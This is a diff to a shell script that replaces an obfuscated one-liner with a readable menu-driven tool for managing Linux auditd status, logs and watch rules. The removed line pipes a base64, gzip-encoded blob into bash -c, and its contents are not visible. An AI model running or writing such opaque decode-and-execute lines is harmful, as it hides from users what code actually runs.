@@ -1,1 +1,74 @@
-bash -c "$(echo H4sICK70XmcAA1RocmVlX29mX0RpYW1vbmRzAK1WXWvbMBR996+4y8rajllpmjaFhj2ENg+DbIwuDMYGRbHUWMSWiiUnDU3/+65k58NxYodQPRhJ9rk699wP+eOH5kjI5ojq0PPu/vR+fD39d9Fu/21125341Hvo/+oP860LXHs0ZcKwx5jL9OwcXj3AMQtFxMEkKe8CU27LjiDiNFmteBAq8Dk0Tl7tMW+N4puGmz4ePHbBF1AYwzDhHNQT3AsaK8n0xrvFXvxAjeETfFdSGJXAQMj0BXrWaehPuTS6Cn84/f3nHzb24VsE7kIeTMDFCRjl6DloQ02qD8FfEvgt+AwSHqCzuZVIjQvgCnybrKTbwAqJBmnkGxHzavwVgR5jQCFJbUopiJfWgAkkhdN5Ff6awAO6POUICFJtVJzzcPbq+Xdy/2lghDWywm4JsA9/Q6D/gpC68d75kxWWq1asrNU7VJ2B/wyNu1CJgN/iOYGbrYuUag4n2SbGabVvR+u8sHSfF2p6BwVX2y4FhRzvykJCyJrotiGdMgV6rg2PAxMt8zbrOaWPu93C1uWxbO+Ffo7o3PItpf1tDVeaajwiCMGPoTcYgI8NIjeyAMwaXce6fSzrvMzWKpcqrY67oSIC/wmaU5o0Ed10drInwXUd9atjqWOFO9pyszZ313qFD6vc7kvDEzAh32gRa2s253F/X/jwfJtp/gzZ4WcNa3FGE/Anef94zO3Ue7X2hTLGGTyhK9ZmRb5vKXp9rKKu5zlNy12vsuB2iDjhc3tp2ukyMEnWUs84GZMvW7qcW4ERUycws5I2TvDLMosKKWfChI6SReZE2OGKdt6hKZTvgvqusPQ6qiN4Uya4TcVeKMijMo4jDOSk7qzP9Wd9k1MaCZbfEgSGWEt0TIU8THKuabD3j+9ngv0Qq37u4unSyqSJtDObbPaXcqePWY5KaIGvwc9Cx5Tk3lvhd9T7D4ytuUHLCgAA | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+auditd_menu() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________"
+        echo "    |              Three of Diamonds           |"
+        echo "    |    Log & Monitor Linux Audit Events      |"
+        echo "    |__________________________________________|"
+        echo "    |                                          |"
+        echo "    |  1. Check audit daemon status            |"
+        echo "    |  2. View recent audit logs               |"
+        echo "    |  3. Monitor audit logs in real-time      |"
+        echo "    |  4. Add a rule to monitor a directory    |"
+        echo "    |  5. Remove a custom audit rule           |"
+        echo "    |  6. View active audit rules              |"
+        echo "    |  7. Exit                                 |"
+        echo "    |__________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Checking audit daemon status...${RESET}"
+                sudo systemctl status auditd
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Displaying recent audit logs:${RESET}"
+                sudo ausearch -m ALL -ts recent | less
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Monitoring audit logs in real-time:${RESET}"
+                sudo tail -f /var/log/audit/audit.log
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Adding an audit rule to monitor a directory:${RESET}"
+                read -p "Enter the directory to monitor: " dir
+                sudo auditctl -w "$dir" -p war -k custom_monitor
+                echo -e "${CYAN}Audit rule added for $dir.${RESET}"
+                ;;
+            5)
+                clear
+                echo -e "${CYAN}Removing a custom audit rule...${RESET}"
+                read -p "Enter the key of the rule to remove (e.g., custom_monitor): " key
+                sudo auditctl -d -k "$key"
+                echo -e "${CYAN}Audit rule with key $key removed.${RESET}"
+                ;;
+            6)
+                clear
+                echo -e "${CYAN}Displaying active audit rules:${RESET}"
+                sudo auditctl -l
+                ;;
+            7)
+                echo -e "${CYAN}Exiting...${RESET}"
+                break
+                ;;
+            *)
+                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
+                ;;
+        esac
+        echo -e "${CYAN}Press any key to return to the menu...${RESET}"
+        read -n 1 -s -r
+    done
+}
+
+auditd_menu
